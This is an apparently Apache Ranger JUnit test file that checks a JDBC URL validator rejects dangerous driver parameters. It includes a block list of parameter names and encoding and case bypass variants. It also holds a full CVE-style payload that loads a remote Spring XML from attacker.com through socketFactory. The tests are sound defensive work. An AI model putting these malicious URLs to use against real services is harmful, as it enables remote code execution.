/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

package org.apache.ranger.services.hive.client;

import org.apache.ranger.plugin.client.HadoopException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class JdbcUrlValidatorTest {
    @Nested
    @DisplayName("Valid JDBC URLs")
    class ValidUrls {
        @Test
        @DisplayName("Simple JDBC URL without parameters")
        void simpleUrlWithoutParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default"));
        }

        @Test
        @DisplayName("URL with safe parameters")
        void urlWithSafeParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?user=test&password=secret&ssl=true"));
        }

        @Test
        @DisplayName("URL with Kerberos parameters")
        void urlWithKerberosParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/default?principal=hive/host@REALM;auth=kerberos"));
        }

        @Test
        @DisplayName("PostgreSQL URL with safe parameters")
        void postgresqlUrlWithSafeParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:postgresql://localhost:5432/db?user=test&ssl=true"));
        }

        @Test
        @DisplayName("URL with leading/trailing whitespace")
        void urlWithWhitespace() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("  jdbc:hive2://host:10000/db  "));
        }
    }

    @Nested
    @DisplayName("Blocked Parameters - Exact Matches")
    class BlockedParameters {
        @ParameterizedTest(name = "blocked parameter: {0}")
        @ValueSource(strings = {
                "socketfactory", "socketfactoryarg", "sslfactory", "sslfactoryarg",
                "sslhostnameverifier", "authenticationpluginclassname", "loggerclassname",
                "kerberosservername", "gssdelegatecred", "sslpasswordcallback"
        })
        @DisplayName("Rejects exact blocked parameter names")
        void rejectsExactBlockedParameters(String blockedParam) {
            String url = "jdbc:hive2://host:10000/db?" + blockedParam + "=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
            assertTrue(exception.getMessage().contains(blockedParam));
        }

        @Test
        @DisplayName("Rejects socketFactory with Spring ClassPathXmlApplicationContext (original CVE)")
        void rejectsOriginalCvePayload() {
            String url = "jdbc:postgresql://127.0.0.1:5432/x" +
                    "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                    "&socketFactoryArg=http://attacker.com/evil.xml";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }
    }

    @Nested
    @DisplayName("Dangerous Pattern Detection")
    class DangerousPatterns {
        @ParameterizedTest(name = "dangerous pattern: {0}")
        @ValueSource(strings = {
                "socketfactory", "sslfactory", "autodeserialize"
        })
        @DisplayName("Rejects parameters containing dangerous patterns")
        void rejectsDangerousPatterns(String pattern) {
            String url = "jdbc:hive2://host:10000/db?custom" + pattern + "=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @Test
        @DisplayName("Rejects MySQL autoDeserialize parameter")
        void rejectsMysqlAutoDeserialize() {
            String url = "jdbc:mysql://host:3306/db?customautodeserialize=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Factory Pattern Detection")
    class FactoryPatterns {
        @ParameterizedTest(name = "factory pattern: {0}")
        @ValueSource(strings = {
                "customsocketfactory", "mysslconnectionfactory", "authfactory",
                "driverfactory", "datasourcefactory"
        })
        @DisplayName("Rejects factory-related parameters")
        void rejectsFactoryParameters(String factoryParam) {
            String url = "jdbc:postgresql://host:5432/db?" + factoryParam + "=com.evil.Factory";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @Test
        @DisplayName("Allows non-dangerous factory parameters")
        void allowsNonDangerousFactory() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?factory=simple&timeout=30"));
        }
    }

    @Nested
    @DisplayName("URL Encoding Bypass Prevention")
    class EncodingBypassPrevention {
        @Test
        @DisplayName("Rejects URL-encoded socketFactory (%46 = F)")
        void rejectsUrlEncodedSocketFactory() {
            String url = "jdbc:hive2://host:10000/db?socket%46actory=malicious";
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }

        @ParameterizedTest(name = "encoded parameter: {0}")
        @ValueSource(strings = {
                "socket%46actory",      // %46 = 'F'
                "socket%66actory",      // %66 = 'f'
                "%73ocketfactory",      // %73 = 's'
                "ssl%46actory",         // SSL factory with encoded F
                "%73sl%46actory"        // Multiple encoded characters
        })
        @DisplayName("Rejects various URL encoding bypass attempts")
        void rejectsEncodedBypassAttempts(String encodedParam) {
            String url = "jdbc:postgresql://host:5432/db?" + encodedParam + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles malformed URL encoding gracefully")
        void handlesMalformedEncoding() {
            String url = "jdbc:hive2://host:10000/db?socket%ZZfactory=test";
            assertDoesNotThrow(() -> {
                try {
                    JdbcUrlValidator.validate(url);
                } catch (HadoopException e) {
                    assertTrue(e.getMessage().contains("prohibited parameter"));
                }
            });
        }
    }

    @Nested
    @DisplayName("Case Sensitivity")
    class CaseSensitivity {
        @ParameterizedTest(name = "case variant: {0}")
        @ValueSource(strings = {
                "SOCKETFACTORY", "SocketFactory", "socketFactory",
                "SSLFACTORY", "SslFactory", "sslFactory"
        })
        @DisplayName("Rejects parameters regardless of case")
        void rejectsParametersRegardlessOfCase(String paramName) {
            String url = "jdbc:hive2://host:10000/db?" + paramName + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles mixed case with encoding")
        void handlesMixedCaseWithEncoding() {
            String url = "jdbc:hive2://host:10000/db?Socket%46actory=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Parameter Separator Handling")
    class ParameterSeparators {
        @Test
        @DisplayName("Handles & separator")
        void handlesAmpersandSeparator() {
            String url = "jdbc:hive2://host:10000/db?user=test&socketfactory=evil&ssl=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles ; separator")
        void handlesSemicolonSeparator() {
            String url = "jdbc:hive2://host:10000/db?user=test;socketfactory=evil;ssl=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles mixed separators")
        void handlesMixedSeparators() {
            String url = "jdbc:hive2://host:10000/db?user=test;ssl=true&socketfactory=evil";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles parameters without values")
        void handlesParametersWithoutValues() {
            String url = "jdbc:hive2://host:10000/db?ssl&socketfactory&timeout=30";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Character Obfuscation")
    class CharacterObfuscation {
        @ParameterizedTest(name = "obfuscated parameter: {0}")
        @ValueSource(strings = {
                "socket.factory", "socket-factory", "socket_factory",
                "ssl.factory", "ssl-factory", "ssl_factory"
        })
        @DisplayName("Rejects parameters with separator character obfuscation")
        void rejectsObfuscatedParameters(String obfuscatedParam) {
            String url = "jdbc:hive2://host:10000/db?" + obfuscatedParam + "=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Handles multiple obfuscation techniques")
        void handlesMultipleObfuscation() {
            String url = "jdbc:hive2://host:10000/db?Socket-Factory_ARG=malicious";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }
    }

    @Nested
    @DisplayName("Edge Cases and Error Conditions")
    class EdgeCases {
        @Test
        @DisplayName("Rejects null URL")
        void rejectsNullUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(null));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Rejects empty URL")
        void rejectsEmptyUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(""));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Rejects whitespace-only URL")
        void rejectsWhitespaceOnlyUrl() {
            HadoopException exception = assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate("   "));
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }

        @Test
        @DisplayName("Handles URL without query parameters")
        void handlesUrlWithoutQueryParameters() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default"));
        }

        @Test
        @DisplayName("Handles URL with empty query string")
        void handlesUrlWithEmptyQueryString() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?"));
        }

        @Test
        @DisplayName("Handles URL with only separators in query")
        void handlesUrlWithOnlySeparators() {
            assertDoesNotThrow(() -> JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?&;&;"));
        }
    }

    @Nested
    @DisplayName("Logging and Sanitization")
    class LoggingAndSanitization {
        @Test
        @DisplayName("Sanitizes URL for logging")
        void sanitizesUrlForLogging() {
            String url = "jdbc:hive2://host:10000/db?password=secret&user=test";
            String sanitized = JdbcUrlValidator.sanitizeForLog(url);
            assertFalse(sanitized.contains("secret"));
            assertTrue(sanitized.contains("<params_redacted>"));
            assertTrue(sanitized.contains("jdbc:hive2://host:10000/db"));
        }

        @Test
        @DisplayName("Handles null URL in sanitization")
        void handlesNullUrlInSanitization() {
            String result = JdbcUrlValidator.sanitizeForLog(null);
            assertEquals("<null>", result);
        }

        @Test
        @DisplayName("Handles URL without parameters in sanitization")
        void handlesUrlWithoutParamsInSanitization() {
            String url = "jdbc:hive2://host:10000/db";
            String result = JdbcUrlValidator.sanitizeForLog(url);
            assertEquals(url, result);
        }
    }

    @Nested
    @DisplayName("Integration Tests")
    class IntegrationTests {
        @Test
        @DisplayName("Complex malicious URL with multiple attack vectors")
        void complexMaliciousUrl() {
            String url = "jdbc:postgresql://evil.com:5432/db" +
                    "?user=admin&password=secret" +
                    "&socket%46actory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                    "&socketFactoryArg=http://attacker.com/evil.xml" +
                    "&SSL-Factory=com.evil.SSLFactory" +
                    "&custom_autodeserialize=true";
            assertThrows(HadoopException.class, () -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("Real-world Hive URL with safe parameters")
        void realWorldHiveUrl() {
            String url = "jdbc:hive2://hive-server:10000/warehouse" +
                    "?principal=hive/hive-server@EXAMPLE.COM" +
                    ";auth=kerberos" +
                    ";ssl=true" +
                    ";sslTrustStore=/etc/hive/truststore.jks" +
                    ";transportMode=http" +
                    ";httpPath=cliservice";
            assertDoesNotThrow(() -> JdbcUrlValidator.validate(url));
        }

        @Test
        @DisplayName("PostgreSQL URL with safe SSL parameters")
        void postgresqlSafeUrl() {
            String url = "jdbc:postgresql://pg-server:5432/mydb" +
                    "?user=admin&password=secret&ssl=true&sslmode=require";
            assertDoesNotThrow(() -> JdbcUrlValidator.validate(url));
        }
    }
}
